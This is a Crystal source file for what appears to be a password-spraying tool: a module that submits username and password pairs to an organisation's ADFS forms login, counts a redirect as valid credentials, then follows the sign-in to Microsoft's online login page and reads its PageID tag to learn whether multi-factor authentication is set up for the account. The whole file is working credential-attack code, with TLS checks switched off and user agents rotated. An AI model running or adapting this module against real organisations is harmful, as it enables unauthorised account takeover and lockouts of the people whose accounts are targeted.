require "http/client"
require "crystagiri"
require "lexbor"
require "uuid"
require "json"



class ADFS_forms < Sprayer
    property domain : String | Nil
    ## only uncomment if needed
    def initialize(usernames : Array(String), password : Array(String) )
        # init any special or default variables here
        super
        @domain = "WORKGROUP"
    end

    # returns an array of [username, password, valid, lockout, mfa]
    def spray(username : String, password : String) : SprayStatus 
        # lockedout = false
        # valid = false
        # mfa = false

        spstatus = SprayStatus.new()
        spstatus.username = username 
        spstatus.password = password 

        # 
        # YOUR CODE BELOW 
        #


        # client_request_id = bc914e24-be0b-45b9-98a4-902182a50d58
        client_request_id = UUID.random
        path = "/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=cbcxt=&username=&mkt=&lc=&rm=true"
        # path = "/adfs/ls/?client-request-id=#{client_request_id}&wa=wsignin1.0&wtrealm=urn%3afederation%3aMicrosoftOnline&wctx=#{ URI.encode_www_form("LoginOptions=3&estsredirect=2&estsrequest=") }=&username=&mkt=&lc="
        

        # some basic setups for web based auth 
        url = URI.parse "#{@target}" 
        #gotta set no verify for tls pages
        context = OpenSSL::SSL::Context::Client.new
        context.verify_mode = OpenSSL::SSL::VerifyMode::NONE
        # create a http client 
        client = HTTP::Client.new(url, tls: context)
        # and some basic header options
        ua = @useragents[rand(0..(@useragents.size - 1))]
        header = HTTP::Headers{ # headers for post request 
            "User-Agent" => ua,
            "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language" => "en-US,en;q=0.5",
            "Accept-Encoding" => "gzip, deflate",
            "Content-Type" => "application/x-www-form-urlencoded",
        }
        
        if @domain.nil?
            form = "UserName=#{URI.encode_www_form(username)}&Password=#{ URI.encode_www_form(password) }&AuthMethod=FormsAuthentication" 
        else 
            form = "UserName=#{URI.encode_www_form(@domain.not_nil!)}%5C#{URI.encode_www_form(username)}&Password=#{ URI.encode_www_form(password) }&AuthMethod=FormsAuthentication"
        end
        
        # here is the basic auth post req
        # the url.path.strip is for added support 
        page = client.post("#{"/#{url.path.strip("/")}" if url.path != "" }#{path}", headers: header, form: form)

        if page.status_code == 302
            # valid = true 
            spstatus.valid_credentials = true 

            # begin the mfa detection safely. if this dies it shouldnt kill the valid portion
            begin 
            # now do some mfa detection here: 
                # by going through the redirect we can get to the msft online portion of redirects. 


                ## do the 1st redir here 
                header = HTTP::Headers{ # headers for post request 
                    "User-Agent" => ua ,
                    "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language" => "en-US,en;q=0.5",
                    "Accept-Encoding" => "gzip, deflate",
                    "Content-Type" => "application/x-www-form-urlencoded",
                    "Cookie" => page.headers["Set-Cookie"].split(";").first 
                }
                path2 = page.headers["Location"]
                page2 = client.get(path2, headers: header )
                
                # # not 100% on this one but it is valid if mfa is in place 
                # if page2.body.includes? "RequestSecurityTokenResponse" 
                #     spstatus.mfa = true # this is super tentative 
                # end 

                


                # set up the msft online variables for the forms post 
                wa = ""
                wresult = ""
                wctx = ""
                lb = Lexbor::Parser.new( page2.body )
                lb.nodes(:input).each do |nod|
                    if nod.attribute_by("name") == "wa"
                        wa = nod.attribute_by("value").as(String)
                    end
                    if nod.attribute_by("name") == "wresult"
                        wresult = nod.attribute_by("value").as(String)
                    end
                    if nod.attribute_by("name") == "wctx"
                        wctx = nod.attribute_by("value").as(String)
                    end
                end


                # pp wa
                # pp wresult 
                # pp wctx 

                # get the "login.microsoftonline.com" page here from the above url form get req 
                client2  = HTTP::Client.new(URI.parse("https://login.microsoftonline.com"), tls: context)
                msft_header = HTTP::Headers{ # headers for post request 
                    "User-Agent" => ua ,
                    "Accept" => "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    "Accept-Language" => "en-US,en;q=0.5",
                    "Accept-Encoding" => "gzip, deflate",
                    "Content-Type" => "application/x-www-form-urlencoded",
                    "Origin" => "https://#{url.host}",
                    "Referer" => "https://#{url.host}/"
                }

                msftonline_body = "wa=#{wa}&wresult=#{URI.encode_www_form(wresult)}&wctx=#{URI.encode_www_form(wctx)}"

                # the mfa check will ask if we want to stay signed in 
                # mfa_check = client2.post("/login.srf?client-request-id=#{client_request_id}", body: msftonline_body , headers: msft_header)
                mfa_check = client2.post("/login.srf", form: msftonline_body , headers: msft_header)


                # we can determine mfa condition by the following html tag: 
                # <meta name="PageID" content="{VALUE}"> 
                # VALUE can be the following: 
                # * ConvergedProofUpRedirect - mfa may be enforced but is not setup 
                # * ConvergedTFA - mfa is setup. the request most likely identifies the mfa methods usable 
                # * ConvergedSignIn - unsure found this on a git issue but exists 
                lb2 = Lexbor::Parser.new( mfa_check.body )
                lb2.nodes(:meta).each do |nod|
                    if nod.attribute_by("name") == "PageID"
                        case nod.attribute_by("content").as(String)
                        when "ConvergedTFA"
                            spstatus.mfa = true
                        when "ConvergedProofUpRedirect"
                            STDERR.puts "MFA IS ON BUT NOT SET UP FOR THIS USER".colorize(:green) 
                            spstatus.mfa = true
                        when "ConvergedSignIn"
                            STDERR.puts "MFA MAY BE SETUP FOR THIS USER. Unconfirmed PageID value".colorize(:yellow) 
                        end 
                    end
                end


                # # pp mfa_check
                # mfst_online_cookies = HTTP::Cookies.from_server_headers mfa_check.headers 
                # mfst_online_cookies.add_request_headers(msft_header)

                # # pp msft_header
                # msft_header["Referer"] = "https://login.microsoftonline.com/"
                # msft_header["Origin"] = "https://login.microsoftonline.com"




                # logonoptions = 3
                # type = 28
                # ctx = "cbcxt="
                # hpgrequestid = ""
                # flowToken = ""
                # canary = ""
                # i19 = ""

                # lb2 = Lexbor::Parser.new( mfa_check.body )
                # lb2.nodes(:script).each do |nod|
                #     if nod.inner_text.includes? "$Config="
                #         json = JSON.parse nod.inner_text.strip( "//<![CDATA[\n$Config=" ).strip(";\n//]]>" )
                #         logonoptions = 3
                #         type = 28
                #         ctx = json["sCtx"]
                #         hpgrequestid = json["sessionId"]
                #         flowToken = json["sFT"]
                #         canary =  json["canary"]
                #         # i19 = 
                #     end
                # end



                # mfst_body = "LoginOptions=#{logonoptions}&type=#{type}&ctx=#{ctx}&hpgrequestid=#{hpgrequestid}&flowToken=#{flowToken}&canary=#{canary}&i19=2839"
                # mfa_check2 = client2.post("/kmsi", headers: msft_header, body:  mfst_body )

               
            rescue e 
                STDERR.puts "MFA Detection crashed for #{username}:#{password}"
                puts "--------------------------------------"
                puts e.message
                puts "--------------------------------------"
            end 
        end


        #
        # end of your CODE make sure you set valid lockedout and mfa 
        # 
        
        # return [username, password, valid, lockedout, mfa]
        return spstatus 
    end
end